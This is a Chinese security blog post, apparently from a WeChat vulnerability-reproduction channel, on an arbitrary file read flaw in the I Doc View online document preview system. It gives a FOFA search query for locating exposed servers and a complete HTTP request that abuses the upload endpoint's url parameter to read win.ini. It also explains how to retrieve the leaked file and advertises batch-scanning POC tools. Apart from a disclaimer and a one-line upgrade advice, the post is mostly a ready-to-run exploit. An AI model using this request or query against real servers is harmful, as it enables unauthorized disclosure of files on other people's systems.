#  ​I Doc View在线文档预览系统存在任意文件读取漏洞 附POC   
 南风漏洞复现文库   2023-12-18 23:33  
  
# I Doc View在线文档预览系统存在任意文件读取漏洞  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. I Doc View在线文档预览系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
I Doc View在线文档预览是一款在线文档预览系统，可以实现文档的预览及文档协作编辑功能。  
## 2.漏洞描述  
  
I Doc View在线文档预览采用了前沿的互联网技术，结合了当今客户需要，为个人或第三方应用提供在线文档预览功能，支持在线文档、压缩文件、图纸文件、图片文件、音频播等多种格式的在线预览。该系统存在任意文件读取漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
I Doc View在线文档预览系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlL3ASe1mkIx6zNRPbJhfwD7rwPnW4dYsKZUx8x09NfJwQxM9yJGibgu4g/640?wx_fmt=jpeg&from=appmsg "null")  
  
I Doc View在线文档预览系统存在任意文件读取漏洞  
## 4.fofa查询语句  
  
title=="在线文档预览 - I Doc View"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt  
  
漏洞数据包：  
```
GET /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLN0e73SABdKIibx8kuVu3Czdica5b1d1PIhCoydjFibreiaR7g5JWahMHiaQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
会返回路径，访问路径，即可看到文件内容  
  
http://127.0.0.1/data/test/2023/1017/17/171836_92_kdCXljt.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLCleB2vg8c4YwXV3YJwybria0cJMQ1icTMOG2t2PBFm0bC08Fp72yDc5Q/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现91 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlL4v9A4L8GBGaswxstaceY9xC5o6pOyMEVygZq5KEYlqVD9rbYmk6qGQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLINxaBic9DnrVqon8GshmZfs9vbvkfHCtQvWmHjX8SD202uCaSEVVicyA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLO5Mjj701oOW2wPmibHBUJPSDhdGpsia3TC4qnjlGyialgqx78TAZtScZQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLGC116eHczs6BBd4YKt9qTOCokhWYIffiaYniauiaIo01tzuMndW7HsuQw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
更新 I Doc View 在线文档预览系统至安全版本：https://www.idocv.com/  
## 8.往期回顾  
  
[Huawei Auth-HTTP Server 1.0 存在任意文件读取漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484801&idx=1&sn=164e4dce864520e05f4f34f5da34d2bb&chksm=974b8886a03c019010e93be86bebc15816389bedcce85a638cbf058f47fa5d036e38a49dfc01&scene=21#wechat_redirect)  
  
  
[奥威亚视频云平台VideoCover.aspx接口存在任意文件上传漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484789&idx=1&sn=7a1fb2328cb346e2651bea73ba7b37b5&chksm=974b8872a03c01644433773de489243aa05cd330b48e34f215d0f40ca90b2d1395fbe124f1f2&scene=21#wechat_redirect)  
  
  
  
  
